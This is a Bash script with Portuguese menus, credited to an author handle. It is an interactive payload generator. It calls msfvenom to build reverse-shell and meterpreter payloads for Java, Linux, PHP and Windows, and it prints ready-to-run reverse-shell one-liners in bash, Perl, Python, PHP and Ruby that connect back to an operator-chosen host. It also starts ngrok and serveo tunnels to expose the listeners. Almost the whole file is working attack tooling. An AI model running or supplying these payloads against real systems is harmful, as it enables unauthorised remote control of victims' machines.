#!/bin/bash
# Autor: Jonatas Fil (@exploitation)

if [ "$EUID" -ne 0 ]
  then echo "[*] Inicie com root..."
  exit
fi

if [ -d "/tmp/exploitation" ] 
then
    clear
else
    mkdir /tmp/exploitation
fi

##################### MENU #####################
clear
sh_Principal () {
clear
cat <<!
                EXPLOITATION
#---------------------------------------------------#
# 1) generate/payload | Gerar Payloads com MSFVENOM #
# 2) generate/reverse | Payloads para Reverse Shell #
# 3) extras/tunneling | Gerar Tunelamento           #
# c) Clear files                                    #
# e) exit                                           #
#---------------------------------------------------#

!
echo -n "[exploitation] > "
read opcao
case $opcao in
	1) sh_payload ;;
  2) sh_reverse ;;
  3) sh_tunneling ;;
  c) sh_clear ;;
  e) sh_sair ;;

	*) echo "\"$opcao\" Opção inválida!"; sleep 2; sh_Principal ;;
esac
}

##################### PAYLOAD #####################
sh_payload () {
clear
cat <<!
                EXPLOITATION
#---------------------------------------------------#
# 1)  java/jsp_shell_reverse_tcp                    #
# 2)  java/shell_reverse_tcp                        #
# 3)  linux/x64/meterpreter/reverse_tcp             #
# 4)  linux/x64/shell/reverse_tcp                   #
# 5)  linux/x86/meterpreter/reverse_tcp             #
# 6)  linux/x86/shell/reverse_tcp                   #
# 7)  php/reverse_php                               #
# 8)  windows/meterpreter_reverse_tcp               #
# 9   windows/shell/reverse_tcp                     #
# 10) windows/x64/meterpreter/reverse_tcp           #
# 11) windows/x64/shell/reverse_tcp                 #
# b)  back                                          #
#---------------------------------------------------#

!
echo -n "[exploitation] > "
read opcao
case $opcao in
  1) jsp_shell_reverse_tcp ;;
  2) java ;;
  3) linux_x64_meterpreter ;;
  4) linux_x64_shell ;;
  5) linux_x86_meterpreter ;;
  6) linux_x86_shell ;;
  7) reverse_php ;;
  8) windows_meterpreter ;;
  9) windows_shell ;;
  10) windows_x64_meterpreter ;;
  11) windows_x64_shell ;;
  b) sh_Principal ;;

  *) echo "\"$opcao\" Opção inválida!"; sleep 2; sh_Principal ;;
esac
}

##################### REVERSE #####################
sh_reverse () {
clear
cat <<!
                EXPLOITATION
#---------------------------------------------------#
# 1) Bash   | Gerar reverse em bash                 #
# 2) Perl   | Gerar reverse em Perl                 #
# 3) Python | Gerar reverse em Python               #
# 4) PHP    | Gerar reverse em PHP                  #
# 5) Ruby   | Gerar reverse em Ruby                 #
# b) back                                           #
#---------------------------------------------------#

!
echo -n "[exploitation] > "
read opcao
case $opcao in
  1) sh_bash ;;
  2) sh_perl ;;
  3) python ;;
  4) php ;;
  5) ruby ;;
  b) sh_Principal ;;

  *) echo "\"$opcao\" Opção inválida!"; sleep 2; sh_Principal ;;
esac
}

##################### TUNELLING #####################
sh_tunneling () {
clear
cat <<!
                EXPLOITATION
#---------------------------------------------------#
# 1) HTTP/HTTPS | NGROK                             #
# 2) TCP        | SERVEO.NET                        #
# b) back                                           #
#---------------------------------------------------#

!
echo -n "[exploitation] > "
read opcao
case $opcao in
  1) ngrok ;;
  2) serveo ;;
  b) sh_Principal ;;

  *) echo "\"$opcao\" Opção inválida!"; sleep 2; sh_Principal ;;
esac
}

# PAYLOADS
jsp_shell_reverse_tcp () {
clear
if [ -d "/tmp/exploitation/payloads/" ] 
then
    clear
else
    mkdir /tmp/exploitation/payloads/
fi
echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo -n "OUTFILE=> "
read OUTFILE
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw > /tmp/exploitation/payloads/$OUTFILE.jsp
if [ -f "/tmp/exploitation/payloads/$OUTFILE.jsp" ]; then
    echo "[*] Payload criado no diretório: /tmp/exploitation/payloads/$OUTFILE.jsp"
    echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
    read ENTER
else 
    echo "[!] Ocorreu algum problema na criação do Payload."
    sleep 5
    sh_payload;
fi

sh_Principal;
}

java () {
clear
if [ -d "/tmp/exploitation/payloads/" ] 
then
    clear
else
    mkdir /tmp/exploitation/payloads/
fi
echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo -n "OUTFILE=> "
read OUTFILE
msfvenom -p java/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o /tmp/exploitation/payloads/$OUTFILE.war
if [ -f "/tmp/exploitation/payloads/$OUTFILE.war" ]; then
    echo "[*] Payload criado no diretório: /tmp/exploitation/payloads/$OUTFILE.war"
    echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
    read ENTER
else 
    echo "[!] Ocorreu algum problema na criação do Payload."
    sleep 5
    sh_payload;
fi

sh_Principal;
}

linux_x64_meterpreter () {
clear
if [ -d "/tmp/exploitation/payloads/" ] 
then
    clear
else
    mkdir /tmp/exploitation/payloads/
fi
echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo -n "OUTFILE=> "
read OUTFILE
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > /tmp/exploitation/payloads/$OUTFILE.elf
if [ -f "/tmp/exploitation/payloads/$OUTFILE.elf" ]; then
    echo "[*] Payload criado no diretório: /tmp/exploitation/payloads/$OUTFILE.elf"
    echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
    read ENTER
else 
    echo "[!] Ocorreu algum problema na criação do Payload."
    sleep 5
    sh_payload;
fi

sh_Principal;
}

linux_x64_shell () {
clear
if [ -d "/tmp/exploitation/payloads/" ] 
then
    clear
else
    mkdir /tmp/exploitation/payloads/
fi
echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo -n "OUTFILE=> "
read OUTFILE
msfvenom -p linux/x64/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > /tmp/exploitation/payloads/$OUTFILE.elf
if [ -f "/tmp/exploitation/payloads/$OUTFILE.elf" ]; then
    echo "[*] Payload criado no diretório: /tmp/exploitation/payloads/$OUTFILE.elf"
    echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
    read ENTER
else 
    echo "[!] Ocorreu algum problema na criação do Payload."
    sleep 5
    sh_payload;
fi

sh_Principal;
}

linux_x86_meterpreter () {
clear
if [ -d "/tmp/exploitation/payloads/" ] 
then
    clear
else
    mkdir /tmp/exploitation/payloads/
fi
echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo -n "OUTFILE=> "
read OUTFILE
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > /tmp/exploitation/payloads/$OUTFILE.elf
if [ -f "/tmp/exploitation/payloads/$OUTFILE.elf" ]; then
    echo "[*] Payload criado no diretório: /tmp/exploitation/payloads/$OUTFILE.elf"
    echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
    read ENTER
else 
    echo "[!] Ocorreu algum problema na criação do Payload."
    sleep 5
    sh_payload;
fi

sh_Principal;
}

linux_x86_shell () {
clear
if [ -d "/tmp/exploitation/payloads/" ] 
then
    clear
else
    mkdir /tmp/exploitation/payloads/
fi
echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo -n "OUTFILE=> "
read OUTFILE
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > /tmp/exploitation/payloads/$OUTFILE.elf
if [ -f "/tmp/exploitation/payloads/$OUTFILE.elf" ]; then
    echo "[*] Payload criado no diretório: /tmp/exploitation/payloads/$OUTFILE.elf"
    echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
    read ENTER
else 
    echo "[!] Ocorreu algum problema na criação do Payload."
    sleep 5
    sh_payload;
fi

sh_Principal;
}

reverse_php () {
clear
if [ -d "/tmp/exploitation/payloads/" ] 
then
    clear
else
    mkdir /tmp/exploitation/payloads/
fi
echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo -n "OUTFILE=> "
read OUTFILE
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT  -f raw > /tmp/exploitation/payloads/$OUTFILE.php
if [ -f "/tmp/exploitation/payloads/$OUTFILE.php" ]; then
    echo "[*] Payload criado no diretório: /tmp/exploitation/payloads/$OUTFILE.php"
    echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
    read ENTER
else 
    echo "[!] Ocorreu algum problema na criação do Payload."
    sleep 5
    sh_payload;
fi

sh_Principal;
}

windows_meterpreter () {
clear
if [ -d "/tmp/exploitation/payloads/" ] 
then
    clear
else
    mkdir /tmp/exploitation/payloads/
fi
echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo -n "OUTFILE=> "
read OUTFILE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT-f exe > /tmp/exploitation/payloads/$OUTFILE.exe
if [ -f "/tmp/exploitation/payloads/$OUTFILE.exe" ]; then
    echo "[*] Payload criado no diretório: /tmp/exploitation/payloads/$OUTFILE.exe"
    echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
    read ENTER
else 
    echo "[!] Ocorreu algum problema na criação do Payload."
    sleep 5
    sh_payload;
fi

sh_Principal;
}

windows_x64_meterpreter () {
clear
if [ -d "/tmp/exploitation/payloads/" ] 
then
    clear
else
    mkdir /tmp/exploitation/payloads/
fi
echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo -n "OUTFILE=> "
read OUTFILE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT-f exe > /tmp/exploitation/payloads/$OUTFILE.exe
if [ -f "/tmp/exploitation/payloads/$OUTFILE.exe" ]; then
    echo "[*] Payload criado no diretório: /tmp/exploitation/payloads/$OUTFILE.exe"
    echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
    read ENTER
else 
    echo "[!] Ocorreu algum problema na criação do Payload."
    sleep 5
    sh_payload;
fi

sh_Principal;
}

windows_shell () {
clear
if [ -d "/tmp/exploitation/payloads/" ] 
then
    clear
else
    mkdir /tmp/exploitation/payloads/
fi
echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo -n "OUTFILE=> "
read OUTFILE
msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > /tmp/exploitation/payloads/$OUTFILE.exe
if [ -f "/tmp/exploitation/payloads/$OUTFILE.exe" ]; then
    echo "[*] Payload criado no diretório: /tmp/exploitation/payloads/$OUTFILE.exe"
    echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
    read ENTER
else 
    echo "[!] Ocorreu algum problema na criação do Payload."
    sleep 5
    sh_payload;
fi

sh_Principal;
}

windows_x64_shell () {
clear
if [ -d "/tmp/exploitation/payloads/" ] 
then
    clear
else
    mkdir /tmp/exploitation/payloads/
fi
echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo -n "OUTFILE=> "
read OUTFILE
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > /tmp/exploitation/payloads/$OUTFILE.exe
if [ -f "/tmp/exploitation/payloads/$OUTFILE.exe" ]; then
    echo "[*] Payload criado no diretório: /tmp/exploitation/payloads/$OUTFILE.exe"
    echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
    read ENTER
else 
    echo "[!] Ocorreu algum problema na criação do Payload."
    sleep 5
    sh_payload;
fi

sh_Principal;
}

sh_bash () {
clear

echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo "======================================"
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo "======================================"
echo "[*] Reverse shell criada !"
echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
read ENTER
sh_Principal;
}

sh_perl () {
clear

echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo "======================================"
echo "perl -e 'use Socket;$i=\"$LHOST\";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo "======================================"
echo "[*] Reverse shell criada !"
echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
read ENTER
sh_Principal;
}

python () {
clear

echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo "======================================"
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo "======================================"
echo "[*] Reverse shell criada !"
echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
read ENTER
sh_Principal;
}

php () {
clear

echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo "======================================"
echo "php -r '$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo "======================================"
echo "[*] Reverse shell criada !"
echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
read ENTER
sh_Principal;
}

ruby () {
clear

echo -n "LHOST=> "
read LHOST
echo -n "LPORT=> "
read LPORT
echo "======================================"
echo "ruby -rsocket -e'f=TCPSocket.open(\"$LHOST\",$LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
echo "======================================"
echo "[*] Reverse shell criada !"
echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
read ENTER
sh_Principal;
}

ngrok () {
clear

echo -n "PORTA=> "
read PORTA
xterm -e "/home/kali/Downloads/ngrok http $PORTA; read" & 
echo "[*] Ngrok iniciado na porta: $PORTA"
echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
read ENTER
sh_Principal;
}

serveo () {
clear

echo -n "PORTA=> "
read PORTA
xterm -e "ssh -R 0:localhost:$PORTA serveo.net; read" & 
echo "[*] Serveo.net iniciado na porta: $PORTA"
echo "[*] PRESSIONE ENTER PARA CONTINUAR..."
read ENTER
sh_Principal;
}

# Exit
sh_clear () {
clear

echo "[!] Apagando arquivos..."
sleep 2
rm /tmp/exploitation/payloads/*
echo "[*] Arquivos deletados !"
sleep 2
echo "[*] PRESSIONE ENTER PARA SAIR..."
read ENTER
sh_Principal
}

sh_sair () {
echo "[*] Saindo..."
sleep 2
clear
exit
}
sh_Principal
